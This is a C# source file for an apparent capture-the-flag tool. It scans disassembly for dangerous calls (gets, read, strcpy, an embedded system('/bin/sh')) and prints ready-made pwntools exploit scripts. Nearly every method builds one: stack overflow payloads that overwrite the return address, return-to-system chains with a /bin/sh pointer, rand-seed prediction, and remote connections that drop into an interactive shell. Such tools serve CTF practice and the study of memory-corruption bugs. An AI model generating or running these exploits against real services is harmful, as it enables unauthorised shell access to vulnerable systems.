using System;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace CTFTool
{
    public class PwnSimpleAnal
    {
        //属性
        private RichTextBox m_cIn;
        private RichTextBox m_cExp;
        private RichTextBox m_cOut;

        //构造
        public PwnSimpleAnal(RichTextBox cIn, RichTextBox cExp, RichTextBox cOut)
        {
            //清空显示区域
            cExp.Text = cOut.Text = "";

            //初始化
            m_cIn = cIn;
            m_cExp = cExp;
            m_cOut = cOut;
        }

        //开始
        public void Start()
        {
            Boolean bExec = false;
            bExec = bExec || PwnExistShellCode();
            bExec = bExec || PwnExistGets();
            bExec = bExec || PwnExistRead();
            bExec = bExec || PwnExistStrcpy();
            if (!bExec)
            {
                m_cExp.Text = m_cExp.Text + "分析失败" + Environment.NewLine;
            }
        }

        //直接可获取shell
        private Boolean PwnExistShellCode()
        {
            if (m_cIn.Text.Contains("system(\"/bin/sh\")"))
            {
                //说明
                m_cExp.Text += "函数中存在ShellCode!";

                //输出
                m_cOut.Text += "from pwn import *\n\n";
                m_cOut.Text += "context(os='linux', arch='amd64', log_level='debug')\n";
                m_cOut.Text += "content = 0\n\n\n";
                m_cOut.Text += "def main():\n";
                m_cOut.Text += "\tif content == 1:\n";
                m_cOut.Text += "\t\tpwn_process = process('./{NAME}')\n";
                m_cOut.Text += "\telse:\n";
                Regex vRegex = new Regex("(.*?):(\\d+)", RegexOptions.Multiline);
                Match vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    m_cOut.Text += "\t\tpwn_process = remote('" + vMatch.Groups[1].Value + "', " + vMatch.Groups[2].Value + ")\n";
                }
                else
                {
                    m_cOut.Text += "\t\tpwn_process = remote('IP', Port)\n";
                }
                m_cOut.Text += "\tpwn_process.interactive()\n\n\n";
                m_cOut.Text += "main()\n";

                return true;
            }
            return false;
        }

        //存在漏洞函数
        private Boolean PwnExistGets()
        {
            if (m_cIn.Text.Contains("gets"))
            {
                //说明
                m_cExp.Text += "函数中存在漏洞函数gets!";

                //输出
                #region Framework
                m_cOut.Text += "from pwn import *\n";
                m_cOut.Text += "from ctypes import *\n\n";
                m_cOut.Text += "context(os='linux', arch='amd64')\n";
                m_cOut.Text += "# context(os='linux', arch='amd64', log_level='debug')\n";
                m_cOut.Text += "# context(os='linux', arch='i386')\n";
                m_cOut.Text += "# context(os='linux', arch='i386', log_level='debug')\n";
                m_cOut.Text += "content = 0\n\n\n";
                m_cOut.Text += "pwn_process_name = '{NAME}'\n";
                m_cOut.Text += "pwn_process_string = b'{STRING}'\n";
                m_cOut.Text += "elf = ELF(pwn_process_name)\n";
                m_cOut.Text += "system_plt_addr = elf.plt['system']\n";
                m_cOut.Text += "bin_sh_addr = next(elf.search(b'/bin/sh'))\n\n\n";
                m_cOut.Text += "# def srand():\n";
                m_cOut.Text += "#     lib = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')\n";
                m_cOut.Text += "#     lib.srand(1)\n";
                m_cOut.Text += "#     for i in range(10):\n";
                m_cOut.Text += "#         number = str(lib.rand() % 6 + 1)\n";
                m_cOut.Text += "#         pwn_process.recvuntil(pwn_process_string)\n";
                m_cOut.Text += "#         pwn_process.sendline(number.encode())\n\n\n";
                m_cOut.Text += "def main():\n";
                m_cOut.Text += "    global pwn_process\n";
                m_cOut.Text += "    if content == 1:\n";
                m_cOut.Text += "        pwn_process = process(pwn_process_name)\n";
                m_cOut.Text += "    else:\n";
                Regex vRegex = new Regex("(.*?):(\\d+)", RegexOptions.Multiline);
                Match vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    m_cOut.Text += "        pwn_process = remote('" + vMatch.Groups[1].Value + "', " + vMatch.Groups[2].Value + ")\n";
                }
                else
                {
                    m_cOut.Text += "        pwn_process = remote('IP', Port)\n";
                }
                #endregion Framework
                #region Payload0
                vRegex = new Regex("\\[rbp-(.*?)h\\]|\\[ebp-(.*?)h\\]");
                vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    m_cOut.Text += "    payload = b'A' * (0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress)\n";
                    m_cOut.Text += "    # payload = b'A' * (0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress + 1)\n";
                    m_cOut.Text += "    # payload = b'A' * (0x" + vMatch.Groups[2].Value + " + 0x4) + p32(Adress)\n";
                    m_cOut.Text += "    # payload = b'A' * (0x" + vMatch.Groups[2].Value + " + 0x4) + p32(system_plt_addr) + b'A' * 4 + p32(bin_sh_addr)\n";
                    m_cOut.Text += "    pwn_process.recvuntil(pwn_process_string)\n";
                    m_cOut.Text += "    pwn_process.sendline(payload)\n";
                }
                #endregion Payload0
                #region Framework
                m_cOut.Text += "    pwn_process.interactive()\n\n\n";
                m_cOut.Text += "main()\n";
                #endregion Framework

                return true;
            }
            return false;
        }

        //存在漏洞函数
        private Boolean PwnExistRead()
        {
            if (m_cIn.Text.Contains("read"))
            {
                //说明
                m_cExp.Text += "函数中存在漏洞函数read!";

                //输出
                GenFrameWorkB();
                #region Payload0
                Regex vRegex = new Regex("unk_([0-9a-fA-F]+)");
                Match vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    String sAddr = "0x" + vMatch.Groups[1].Value;
                    vRegex = new Regex("dword_([0-9a-fA-F]+)");
                    vMatch = vRegex.Match(m_cIn.Text);
                    if (vMatch.Success)
                    {
                        m_cOut.Text += "    payload = b'a' * (0x" + vMatch.Groups[1].Value + " - " + sAddr + ")\n";
                        m_cOut.Text += "    payload = payload + p64({VALUE})\n";
                        m_cOut.Text += "    pwn_process.recvuntil(pwn_process_string)\n";
                        m_cOut.Text += "    pwn_process.sendline(payload)\n";
                    }
                }
                #endregion Payload0
                #region Payload1
                vRegex = new Regex("\\[rbp-(.*?)h\\]|\\[ebp-(.*?)h\\]");
                vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    m_cOut.Text += "    payload = b'A' * (0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress)\n";
                    m_cOut.Text += "    # payload = b'A' * (0x" + vMatch.Groups[2].Value + " + 0x4) + p32(Adress)\n";
                    m_cOut.Text += "    # payload = b'A' * (0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress + 1)\n";
                    m_cOut.Text += "    # payload = b'A' * (0x" + vMatch.Groups[2].Value + " + 0x4) + p32(system_plt_addr) + b'A' * 4 + p32(bin_sh_addr)\n";
                    m_cOut.Text += "    pwn_process.recvuntil(pwn_process_string)\n";
                    m_cOut.Text += "    pwn_process.sendline(payload)\n";
                }
                #endregion Payload1
                #region Framework
                m_cOut.Text += "    pwn_process.interactive()\n\n\n";
                m_cOut.Text += "main()\n";
                #endregion Framework

                return true;
            }
            return false;
        }

        //存在漏洞函数
        private Boolean PwnExistStrcpy()
        {
            if (m_cIn.Text.Contains("strcpy"))
            {
                //说明
                m_cExp.Text += "函数中存在漏洞函数strcpy!";

                //输出
                GenFrameWorkB();
                #region Payload0
                Regex vRegex = new Regex("\\[rbp-(.*?)h\\]|\\[ebp-(.*?)h\\]");
                Match vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    m_cOut.Text += "    payload = b'A' * (0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress)\n";
                    m_cOut.Text += "    # payload = b'A' * (0x" + vMatch.Groups[2].Value + " + 0x4) + p32(Adress)\n";
                    m_cOut.Text += "    # payload = b'A' * (0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress + 1)\n";
                    m_cOut.Text += "    # payload = b'A' * (0x" + vMatch.Groups[2].Value + " + 0x4) + p32(system_plt_addr) + b'A' * 4 + p32(bin_sh_addr)\n";
                    m_cOut.Text += "    # payload = payload.ljust(259, b'a')\n";
                    m_cOut.Text += "    pwn_process.recvuntil(pwn_process_string)\n";
                    m_cOut.Text += "    pwn_process.sendline(payload)\n";
                }
                #endregion Payload0
                #region Framework
                m_cOut.Text += "    pwn_process.interactive()\n\n\n";
                m_cOut.Text += "main()\n";
                #endregion Framework

                return true;
            }
            return false;
        }

        //框架代码
        private void GenFrameWorkB()
        {
            m_cOut.Text += "from pwn import *\n";
            m_cOut.Text += "from ctypes import *\n\n";
            m_cOut.Text += "context(os='linux', arch='amd64')\n";
            m_cOut.Text += "# context(os='linux', arch='amd64', log_level='debug')\n";
            m_cOut.Text += "# context(os='linux', arch='i386')\n";
            m_cOut.Text += "# context(os='linux', arch='i386', log_level='debug')\n";
            m_cOut.Text += "content = 0\n\n\n";
            m_cOut.Text += "pwn_process_name = '{NAME}'\n";
            m_cOut.Text += "pwn_process_string = b'{STRING}'\n";
            m_cOut.Text += "elf = ELF(pwn_process_name)\n";
            m_cOut.Text += "main_addr = elf.symbols['main']\n";
            m_cOut.Text += "# write_plt_addr = elf.plt['write']\n";
            m_cOut.Text += "# write_got_addr = elf.got['write']\n";
            m_cOut.Text += "# system_plt_addr = elf.plt['system']\n";
            m_cOut.Text += "# bin_sh_addr = next(elf.search(b'/bin/sh'))\n\n\n";
            m_cOut.Text += "# def srand():\n";
            m_cOut.Text += "#     lib = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')\n";
            m_cOut.Text += "#     lib.srand(1)\n";
            m_cOut.Text += "#     for i in range(10):\n";
            m_cOut.Text += "#         number = str(lib.rand()%6 + 1)\n";
            m_cOut.Text += "#         pwn_process.recvuntil(pwn_process_string)\n";
            m_cOut.Text += "#         pwn_process.sendline(number.encode())\n\n\n";
            m_cOut.Text += "def main():\n";
            m_cOut.Text += "    # global pwn_process\n";
            m_cOut.Text += "    if content == 1:\n";
            m_cOut.Text += "        pwn_process = process('./'" + " + pwn_process_name)\n";
            m_cOut.Text += "    else:\n";
            Regex vRegex = new Regex("(.*?):(\\d+)", RegexOptions.Multiline);
            Match vMatch = vRegex.Match(m_cIn.Text);
            if (vMatch.Success)
            {
                m_cOut.Text += "        pwn_process = remote('" + vMatch.Groups[1].Value + "', " + vMatch.Groups[2].Value + ")\n";
            }
            else
            {
                m_cOut.Text += "        pwn_process = remote('IP', Port)\n";
            }
        }
    }
}